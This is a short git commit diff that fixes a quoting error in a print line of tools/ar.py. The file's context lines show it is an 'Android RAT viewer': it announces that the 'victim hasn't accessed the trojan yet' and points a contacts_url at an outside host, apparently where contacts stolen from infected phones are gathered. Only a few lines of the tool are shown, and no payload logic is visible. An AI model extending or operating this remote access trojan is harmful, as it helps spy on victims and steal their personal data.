ead85a95ddb8bbd43e1389b98a6bccd40a76027f
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2026-06-20 03:15:37 -0500

    Update ar.py

--- tools/ar.py
+++ tools/ar.py
@@ -6,7 +6,7 @@ GREEN = "\033[32m"
 BLUE = "\033[34m"
 RESET = "\033[0m"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
-print(f"{BLUE}Coded by Nihility"{RESET})
+print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
 print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
 time.sleep(1)
